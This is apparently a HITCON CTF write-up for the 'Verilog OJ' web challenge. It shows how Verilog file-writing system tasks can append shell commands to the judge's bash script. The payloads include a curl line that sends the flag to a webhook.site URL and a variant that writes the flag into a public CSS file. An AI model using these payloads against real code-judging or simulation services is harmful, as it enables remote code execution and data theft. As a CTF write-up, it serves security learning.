---
title: Verilog OJ
summary: Yes, we need Online Judge for Verilog for our Logic Design course.
tags: [HitconCTF, Web, Misc, Command Injection]
date: 2025-08-24
showtoc: true
---

# Verilog OJ

## Description

Yes, we need Online Judge for Verilog for our Logic Design course.

Author: t510599

[Given files](/hitconctf/verilog-oj/verilog-oj.tar.gz)

## Solution

The web application is an online platform with Verilog problems, similar to LeetCode, but focused exclusively on a single Verilog problem.

![problem](/hitconctf/verilog-oj/problem.png)

[Verilog](https://en.wikipedia.org/wiki/Verilog) is a hardware description language used to design and verify digital circuits.

To test the application, I used an AI to generate a solution to the problem and submitted the resulting Verilog code.

```verilog
module Crossbar_2x2_4bit(in1, in2, control, out1, out2);
    input [3:0] in1, in2;
    input control;
    output [3:0] out1, out2;

    // mux logic for crossbar switch
    assign out1 = (control) ? in1 : in2;
    assign out2 = (control) ? in2 : in1;
endmodule
```

Upon submitting the code, I received a score of "AC" (All Correct), indicating that the application likely executed my input.

![submission](/hitconctf/verilog-oj/submission.png)

Since I confirmed that my submission was executed, I realized I could potentially exploit this by writing Verilog code to fetch and retrieve the flag from the server using a webhook.

I then examined the application's code to identify any security measures preventing this.
Surprisingly, I found that there was no sanitization applied to the submissions.

```ruby
module VerilogOJ
  # Judge Job
  class JudgeJob
    include Sidekiq::Job

    def perform(submission_id)
      submission = Submission.first(id: submission_id)
      return if submission.nil? || submission.result != 'Q'

      dir = prepare(submission)
      result, output = judge dir
      submission.update(result: result, output: output) unless result.nil?
      FileUtils.remove_dir(dir, force: true)
    end

    def prepare(submission)
      dir = Dir.mktmpdir("submission_#{submission.id}_")
      File.write("#{dir}/testbench.v", submission.problem.testbench)
      File.write("#{dir}/module.v", submission.code)
      dir
    end

    def judge(dir) # rubocop:disable Metrics/MethodLength
      stdout, stderr, status = Timeout.timeout(15) do
        # Simplify error handling by letting iverilog and vvp fail in a single script
        script_path = File.realpath("#{File.dirname(__FILE__)}/../../scripts/judge.sh")
        # iverilog is safe to execute
        Open3.capture3("#{script_path} #{dir}")
      end

      return ['RE', stderr] unless status.exitstatus.zero?

      if !stdout.nil? && stdout.strip.lines.last == 'Passed'
        ['AC', stdout]
      else
        ['WA', stdout]
      end
    rescue Timeout::Error
      ['TLE', 'Execution timed out']
    rescue StandardError => e
      ['RE', e.message]
    end
  end
end
```

The application simply runs a bash script, which executes the submission and verifies that no errors occurred, and that the tests passed.

```sh
cd "$1"
iverilog module.v testbench.v -o judge
vvp judge
```

I then attempted to craft Verilog code that could exploit this behavior to fetch the flag.
At first, I assumed Verilog could be used like a typical programming language, but it turns out that Verilog is a hardware description language, not a general-purpose programming language.
This means you can't use typical features like executing shell commands or sending HTTP requests directly.

To understand Verilog better, I consulted a [Verilog tutorial](https://www.chipverify.com/tutorials/verilog), where I learned that while Verilog could still perform basic file operations, such as reading and writing files.

Next, I realized that I couldn’t directly read the flag because only the root user has permission to access it.
The flag is stored in a file that is only accessible by the root user.
To read it, I needed to execute the command `/readflag give me the flag`.
However, this required executing a shell command, which is not something Verilog can do directly.

But I found an interesting file to overwrite: the bash script that runs my submission.
If I could modify this script, I could append the `/readflag give me the flag` command to it, and that would allow me to access the flag.

To verify this, I wrote a Verilog submission that appends a `curl` command to send a webhook request, and after submitting it, I saw my webhook receive a request, confirming that the exploit was successful.

All I had to do now, was to add a subshell to retrieve the flag.

```verilog
module Crossbar_2x2_4bit(in1, in2, control, out1, out2);
    input [3:0] in1, in2;
    input control;
    output [3:0] out1, out2;
    integer fd;

    // mux logic for crossbar switch
    assign out1 = (control) ? in1 : in2;
    assign out2 = (control) ? in2 : in1;

    initial begin
        fd = $fopen ("/app/scripts/judge.sh", "a+");
        $fwrite(fd, "curl https://webhook.site/07e78043-4cf9-4ad4-aaaa-fec865b06cde?`/readflag give me the flag`");
        $fclose(fd);
    end
endmodule
```

While it worked locally, no requests arrived when I submitted the payload remotely.
After tweaking the payload several times with no success, I contacted the organizers and was informed that the remote instance didn’t have internet access, which meant I couldn’t use a webhook to retrieve the flag.

Luckily, I quickly found a workaround.
Since I could modify a bash script, I also had the ability to modify other files, particularly static files like CSS files.
These files could be used to write the flag, which I could later retrieve through my browser.

I then opened a terminal within my Docker instance to locate a CSS file and updated my payload accordingly.

```verilog
module Crossbar_2x2_4bit(in1, in2, control, out1, out2);
    input [3:0] in1, in2;
    input control;
    output [3:0] out1, out2;
    integer fd;

    // mux logic for crossbar switch
    assign out1 = (control) ? in1 : in2;
    assign out2 = (control) ? in2 : in1;

    initial begin
        fd = $fopen ("/app/scripts/judge.sh", "a+");
        $fwrite(fd, "/readflag give me the flag >> /app/app/presentation/assets/css/style.css");
        $fclose(fd);
    end
endmodule
```

This time, I was able to retrieve the flag both locally and from the remote instance.

```sh
$ curl http://localhost:9292/assets/css/style.css | tail                                 
  font-family: 'Cascadia Code', monospace;
}

code:not(pre > code) {
  background-color: #f8f9fa;
  padding: 0.2em 0.4em;
  border-radius: 4px;
}
hitcon{1_u$ed_t0_beli3v3_th4t_Judging_VeriloG_is_VERY_S@f3_Fr0m_RCE_QAQ}
```
